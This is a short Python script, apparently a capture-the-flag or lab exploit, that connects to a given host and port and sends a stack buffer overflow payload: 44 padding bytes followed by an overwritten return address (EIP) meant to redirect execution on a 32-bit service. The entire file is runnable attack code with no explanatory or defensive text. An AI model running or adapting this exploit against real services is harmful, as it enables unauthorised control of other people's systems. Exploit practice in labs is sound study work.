#!/usr/bin/env python3
import socket
import argparse


parser = argparse.ArgumentParser()
parser.add_argument(
    "host", type=str, help="The hostname or IP address to connect to")
parser.add_argument(
    "port", type=int, help="The port for the service to connect to")

args = parser.parse_args()

offset = 44
new_eip = b'\xf6\x91\x04\x08'

payload = b''.join([
    b'A'*44,
    new_eip,
    b'\n',
])

print(payload)

with socket.socket() as connection:
    connection.connect((args.host, args.port))
    print(connection.recv(4096).decode('utf-8'))
    connection.send(payload)
    print(connection.recv(4096).decode('utf-8'))
    print(connection.recv(4096).decode('utf-8'))
